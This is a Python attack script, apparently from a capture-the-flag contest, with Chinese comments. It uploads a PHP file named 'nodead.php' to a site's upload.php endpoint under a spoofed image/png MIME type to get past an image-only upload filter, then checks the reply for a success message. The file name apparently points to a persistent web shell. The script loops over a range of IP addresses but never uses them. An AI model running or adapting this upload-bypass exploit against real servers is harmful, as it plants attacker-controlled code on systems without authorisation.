import requests

targets = [f"10.0.0.{i}" for i in range(1, 51)]
for ip in targets:
    url = "http://7bab6831fceac2be23b4fefd.http-ctf2.dasctf.com"
    upload_url = '/upload.php'
    session = requests.Session()
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0'}
    file = {
        'uploaded': ('nodead.php', open('nodead.php', 'rb'), 'image/png'),# 图片文件格式:file={'字段名': ('文件名', 文件内容/对象, 'MIME类型')，submit},字段名需要抓包获取
        'submit': (None, 'Submit'),
    }
    url2 = url + upload_url
    r2 = session.post(url=url2, files=file, headers=header)
    r2.encoding = r2.apparent_encoding
    print(r2)
    if r2.status_code != 200:
        print(url2 + "  上传失败")
    else:
        for text in r2.text.split('\n'):
            print(text)
            if '上传成功' in text:
                print(url2 + "  上传成功")
                break
